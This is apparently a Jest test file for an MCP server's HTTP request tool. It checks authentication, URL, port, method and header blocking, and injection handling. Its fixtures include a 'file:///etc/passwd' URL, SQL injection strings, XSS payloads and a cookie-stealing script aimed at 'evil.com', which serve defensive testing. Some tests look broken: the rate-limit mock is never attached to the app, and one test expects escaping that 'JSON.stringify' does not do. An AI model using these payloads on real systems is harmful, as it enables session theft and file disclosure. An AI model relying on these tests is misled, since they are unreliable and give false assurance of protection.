/**
 * HTTP Request Tool - Security Scenario Testing
 * Tests security validations, malicious input handling, and boundary conditions
 */

const request = require('supertest');
const express = require('express');

// Mock the http-client module
jest.mock('../server/src/utils/http-client', () => {
  return {
    executeRequest: jest.fn()
  };
});

// Mock other dependencies
jest.mock('../server/src/utils/logger', () => ({
  info: jest.fn(),
  error: jest.fn(),
  warn: jest.fn(),
  security: jest.fn()
}));

jest.mock('../server/src/utils/auth-manager', () => ({
  isAuthEnabled: () => true,
  validateToken: jest.fn(),
  extractToken: jest.fn()
}));

jest.mock('../server/src/utils/rate-limiter', () => ({
  middleware: jest.fn((req, res, next) => next())
}));

describe('HTTP Request Tool - Security Scenarios', () => {
  let app;
  let httpClient;
  let authManager;

  beforeEach(() => {
    // Clear all mocks
    jest.clearAllMocks();

    // Get the mocked modules
    httpClient = require('../server/src/utils/http-client');
    authManager = require('../server/src/utils/auth-manager');

    // Default auth setup
    authManager.validateToken.mockReturnValue(true);
    authManager.extractToken.mockReturnValue('valid-token');

    // Create a minimal Express app with our MCP endpoint
    app = express();
    app.use(express.json({ limit: '10mb' }));
    
    // Mock MCP server endpoint with security validations
    app.post('/mcp', async (req, res) => {
      const { method, params } = req.body;
      
      // Authentication check
      if (authManager.isAuthEnabled() && !authManager.validateToken(authManager.extractToken(req))) {
        return res.status(401).json({
          jsonrpc: '2.0',
          id: req.body.id,
          error: {
            code: -32001,
            message: 'Authentication required'
          }
        });
      }
      
      if (method === 'tools/call' && params.name === 'http_request') {
        const args = params.arguments;
        
        try {
          // Validate required parameters
          if (!args.url || !args.method) {
            throw new Error('url and method are required');
          }

          // Security validation would happen in http-client
          const httpResult = await httpClient.executeRequest({
            url: args.url,
            method: args.method,
            headers: args.headers || {},
            body: args.body,
            json: args.json,
            timeout: args.timeout || 30,
            followRedirects: args.followRedirects !== false
          });

          if (httpResult.success) {
            const responseData = {
              success: true,
              statusCode: httpResult.statusCode,
              statusMessage: httpResult.statusMessage,
              headers: httpResult.headers,
              body: httpResult.body,
              executionTime: httpResult.executionTime,
              requestId: httpResult.requestId,
              timestamp: new Date().toISOString()
            };

            res.json({
              jsonrpc: '2.0',
              id: req.body.id,
              result: {
                content: [{ type: 'text', text: JSON.stringify(responseData, null, 2) }]
              }
            });
          } else {
            const errorData = {
              success: false,
              error: httpResult.error,
              executionTime: httpResult.executionTime,
              requestId: httpResult.requestId,
              timestamp: new Date().toISOString()
            };

            res.json({
              jsonrpc: '2.0',
              id: req.body.id,
              result: {
                content: [{ type: 'text', text: JSON.stringify(errorData, null, 2) }]
              }
            });
          }
        } catch (error) {
          res.status(400).json({
            jsonrpc: '2.0',
            id: req.body.id,
            error: {
              code: -32602,
              message: 'Invalid params',
              data: error.message
            }
          });
        }
      } else {
        res.status(404).json({
          jsonrpc: '2.0',
          id: req.body.id,
          error: {
            code: -32601,
            message: 'Method not found'
          }
        });
      }
    });
  });

  describe('Authentication Security', () => {
    test('should reject requests without valid authentication', async () => {
      authManager.validateToken.mockReturnValue(false);
      authManager.extractToken.mockReturnValue(null);

      const response = await request(app)
        .post('/mcp')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'GET'
            }
          }
        });

      expect(response.status).toBe(401);
      expect(response.body.error.message).toBe('Authentication required');
      expect(httpClient.executeRequest).not.toHaveBeenCalled();
    });

    test('should accept requests with valid authentication', async () => {
      authManager.validateToken.mockReturnValue(true);
      authManager.extractToken.mockReturnValue('valid-token');

      const mockResponse = {
        success: true,
        statusCode: 200,
        statusMessage: 'OK',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ message: 'authenticated' }),
        executionTime: 100,
        requestId: 'req_auth',
        url: 'http://localhost:8080/api/test',
        method: 'GET'
      };

      httpClient.executeRequest.mockResolvedValue(mockResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'GET'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(httpClient.executeRequest).toHaveBeenCalled();
    });
  });

  describe('Malicious URL Validation', () => {
    test('should block non-localhost URLs when localhost-only mode enabled', async () => {
      const mockResponse = {
        success: false,
        error: 'Only localhost requests are allowed in localhost-only mode',
        executionTime: 0,
        requestId: 'req_blocked',
        url: 'http://malicious-site.com/steal-data',
        method: 'GET'
      };

      httpClient.executeRequest.mockResolvedValue(mockResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://malicious-site.com/steal-data',
              method: 'GET'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.result.content[0].text).toContain('Only localhost requests are allowed');
    });

    test('should block requests to restricted ports', async () => {
      const restrictedPorts = [22, 23, 25, 53, 135, 139, 445, 3389];
      
      for (const port of restrictedPorts) {
        const mockResponse = {
          success: false,
          error: `Port ${port} is not allowed for security reasons`,
          executionTime: 0,
          requestId: `req_blocked_${port}`,
          url: `http://localhost:${port}/test`,
          method: 'GET'
        };

        httpClient.executeRequest.mockResolvedValue(mockResponse);

        const response = await request(app)
          .post('/mcp')
          .set('Authorization', 'Bearer valid-token')
          .send({
            jsonrpc: '2.0',
            id: port,
            method: 'tools/call',
            params: {
              name: 'http_request',
              arguments: {
                url: `http://localhost:${port}/test`,
                method: 'GET'
              }
            }
          });

        expect(response.status).toBe(200);
        expect(response.body.result.content[0].text).toContain(`Port ${port} is not allowed`);
      }
    });

    test('should block requests with malicious URL schemes', async () => {
      const maliciousUrls = [
        'file:///etc/passwd',
        'ftp://localhost/files',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'chrome://settings',
        'about:blank'
      ];

      for (const maliciousUrl of maliciousUrls) {
        const mockResponse = {
          success: false,
          error: 'Invalid URL scheme. Only HTTP and HTTPS are allowed',
          executionTime: 0,
          requestId: 'req_blocked_scheme',
          url: maliciousUrl,
          method: 'GET'
        };

        httpClient.executeRequest.mockResolvedValue(mockResponse);

        const response = await request(app)
          .post('/mcp')
          .set('Authorization', 'Bearer valid-token')
          .send({
            jsonrpc: '2.0',
            id: 1,
            method: 'tools/call',
            params: {
              name: 'http_request',
              arguments: {
                url: maliciousUrl,
                method: 'GET'
              }
            }
          });

        expect(response.status).toBe(200);
        expect(response.body.result.content[0].text).toContain('Invalid URL scheme');
      }
    });
  });

  describe('Injection Attack Prevention', () => {
    test('should safely handle SQL injection attempts in headers', async () => {
      const maliciousHeaders = {
        'X-Custom-Header': "'; DROP TABLE users; --",
        'User-Agent': "Mozilla/5.0'; SELECT * FROM passwords; --",
        'Authorization': "Bearer token'; UNION SELECT password FROM users; --"
      };

      const mockResponse = {
        success: true,
        statusCode: 200,
        statusMessage: 'OK',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ message: 'headers processed safely' }),
        executionTime: 100,
        requestId: 'req_safe_headers',
        url: 'http://localhost:8080/api/test',
        method: 'POST'
      };

      httpClient.executeRequest.mockResolvedValue(mockResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'POST',
              headers: maliciousHeaders
            }
          }
        });

      expect(response.status).toBe(200);
      expect(httpClient.executeRequest).toHaveBeenCalledWith({
        url: 'http://localhost:8080/api/test',
        method: 'POST',
        headers: maliciousHeaders,
        body: undefined,
        json: undefined,
        timeout: 30,
        followRedirects: true
      });
    });

    test('should safely handle XSS attempts in JSON payload', async () => {
      const maliciousPayload = {
        message: '<script>alert("XSS")</script>',
        html_content: '<img src="x" onerror="alert(\'XSS\')">',
        comment: '"><script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
        code: 'eval("malicious code here")'
      };

      const mockResponse = {
        success: true,
        statusCode: 200,
        statusMessage: 'OK',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ message: 'payload processed safely' }),
        executionTime: 200,
        requestId: 'req_safe_payload',
        url: 'http://localhost:8080/api/submit',
        method: 'POST'
      };

      httpClient.executeRequest.mockResolvedValue(mockResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/submit',
              method: 'POST',
              json: maliciousPayload
            }
          }
        });

      expect(response.status).toBe(200);
      expect(httpClient.executeRequest).toHaveBeenCalledWith({
        url: 'http://localhost:8080/api/submit',
        method: 'POST',
        headers: {},
        body: undefined,
        json: maliciousPayload,
        timeout: 30,
        followRedirects: true
      });
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    test('should handle rate limiting for excessive requests', async () => {
      const rateLimiter = require('../server/src/utils/rate-limiter');
      
      // Mock rate limiter to reject request
      rateLimiter.middleware.mockImplementation((req, res, next) => {
        res.status(429).json({
          jsonrpc: '2.0',
          id: req.body.id,
          error: {
            code: -32000,
            message: 'Rate limit exceeded. Too many requests.',
            data: 'Maximum 60 requests per minute allowed'
          }
        });
      });

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'GET'
            }
          }
        });

      expect(response.status).toBe(429);
      expect(response.body.error.message).toContain('Rate limit exceeded');
    });

    test('should reject requests with excessive timeout values', async () => {
      const mockResponse = {
        success: false,
        error: 'Timeout value exceeds maximum allowed (300 seconds)',
        executionTime: 0,
        requestId: 'req_timeout_rejected',
        url: 'http://localhost:8080/api/test',
        method: 'GET'
      };

      httpClient.executeRequest.mockResolvedValue(mockResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'GET',
              timeout: 3600  // 1 hour - excessive
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.result.content[0].text).toContain('Timeout value exceeds maximum');
    });
  });

  describe('Large Payload Protection', () => {
    test('should handle large JSON payloads within limits', async () => {
      const largeButValidPayload = {
        data: 'x'.repeat(1024 * 1024), // 1MB string
        array: new Array(1000).fill('test data'),
        nested: {
          level1: { level2: { level3: 'deep nesting test' }}
        }
      };

      const mockResponse = {
        success: true,
        statusCode: 200,
        statusMessage: 'OK',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ message: 'large payload processed' }),
        executionTime: 500,
        requestId: 'req_large_payload',
        url: 'http://localhost:8080/api/large',
        method: 'POST'
      };

      httpClient.executeRequest.mockResolvedValue(mockResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/large',
              method: 'POST',
              json: largeButValidPayload
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.result.content[0].text).toContain('large payload processed');
    });

    test('should reject excessively large payloads', async () => {
      // Express will reject this before it reaches our handler due to the 10mb limit
      const massivePayload = 'x'.repeat(11 * 1024 * 1024); // 11MB

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'POST',
              body: massivePayload
            }
          }
        });

      expect(response.status).toBe(413); // Payload Too Large
    });
  });

  describe('HTTP Method Security', () => {
    test('should allow standard HTTP methods', async () => {
      const allowedMethods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'];

      for (const method of allowedMethods) {
        const mockResponse = {
          success: true,
          statusCode: 200,
          statusMessage: 'OK',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ method: method }),
          executionTime: 100,
          requestId: `req_${method.toLowerCase()}`,
          url: 'http://localhost:8080/api/test',
          method: method
        };

        httpClient.executeRequest.mockResolvedValue(mockResponse);

        const response = await request(app)
          .post('/mcp')
          .set('Authorization', 'Bearer valid-token')
          .send({
            jsonrpc: '2.0',
            id: 1,
            method: 'tools/call',
            params: {
              name: 'http_request',
              arguments: {
                url: 'http://localhost:8080/api/test',
                method: method
              }
            }
          });

        expect(response.status).toBe(200);
      }
    });

    test('should block dangerous HTTP methods', async () => {
      const dangerousMethods = ['TRACE', 'CONNECT', 'TRACK'];

      for (const method of dangerousMethods) {
        const mockResponse = {
          success: false,
          error: `HTTP method ${method} is not allowed for security reasons`,
          executionTime: 0,
          requestId: `req_blocked_${method.toLowerCase()}`,
          url: 'http://localhost:8080/api/test',
          method: method
        };

        httpClient.executeRequest.mockResolvedValue(mockResponse);

        const response = await request(app)
          .post('/mcp')
          .set('Authorization', 'Bearer valid-token')
          .send({
            jsonrpc: '2.0',
            id: 1,
            method: 'tools/call',
            params: {
              name: 'http_request',
              arguments: {
                url: 'http://localhost:8080/api/test',
                method: method
              }
            }
          });

        expect(response.status).toBe(200);
        expect(response.body.result.content[0].text).toContain(`HTTP method ${method} is not allowed`);
      }
    });
  });

  describe('Header Security Validation', () => {
    test('should filter dangerous headers', async () => {
      const dangerousHeaders = {
        'Host': 'evil.com',
        'Origin': 'http://malicious-site.com',
        'Referer': 'http://malicious-site.com/attack',
        'X-Forwarded-For': '192.168.1.1',
        'X-Real-IP': '10.0.0.1',
        'Proxy-Authorization': 'Basic secret'
      };

      const mockResponse = {
        success: false,
        error: 'One or more headers are not allowed for security reasons',
        executionTime: 0,
        requestId: 'req_blocked_headers',
        url: 'http://localhost:8080/api/test',
        method: 'POST'
      };

      httpClient.executeRequest.mockResolvedValue(mockResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'POST',
              headers: dangerousHeaders
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.result.content[0].text).toContain('headers are not allowed');
    });

    test('should allow safe custom headers', async () => {
      const safeHeaders = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Authorization': 'Bearer token',
        'User-Agent': 'MCP-Client/1.0.37',
        'X-API-Key': 'api-key-123',
        'X-Request-ID': 'req-123',
        'Accept-Language': 'en-US,en;q=0.9'
      };

      const mockResponse = {
        success: true,
        statusCode: 200,
        statusMessage: 'OK',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ message: 'safe headers accepted' }),
        executionTime: 100,
        requestId: 'req_safe_headers',
        url: 'http://localhost:8080/api/test',
        method: 'POST'
      };

      httpClient.executeRequest.mockResolvedValue(mockResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'POST',
              headers: safeHeaders
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.result.content[0].text).toContain('safe headers accepted');
    });
  });

  describe('Response Security', () => {
    test('should sanitize potentially dangerous response content', async () => {
      const dangerousResponse = {
        success: true,
        statusCode: 200,
        statusMessage: 'OK',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          message: 'Response with <script>alert("xss")</script> content',
          html: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
          data: 'eval("malicious code")'
        }),
        executionTime: 100,
        requestId: 'req_dangerous_response',
        url: 'http://localhost:8080/api/test',
        method: 'GET'
      };

      httpClient.executeRequest.mockResolvedValue(dangerousResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'GET'
            }
          }
        });

      expect(response.status).toBe(200);
      // Response should be properly JSON encoded, preventing script execution
      expect(response.body.result.content[0].text).toContain('\\u003cscript\\u003e');
      expect(typeof response.body.result.content[0].text).toBe('string');
    });

    test('should handle malformed JSON responses safely', async () => {
      const malformedResponse = {
        success: true,
        statusCode: 200,
        statusMessage: 'OK',
        headers: { 'content-type': 'application/json' },
        body: 'Invalid JSON: {broken json}',
        executionTime: 100,
        requestId: 'req_malformed',
        url: 'http://localhost:8080/api/test',
        method: 'GET'
      };

      httpClient.executeRequest.mockResolvedValue(malformedResponse);

      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer valid-token')
        .send({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'http_request',
            arguments: {
              url: 'http://localhost:8080/api/test',
              method: 'GET'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.result.content[0].text).toContain('Invalid JSON: {broken json}');
    });
  });
});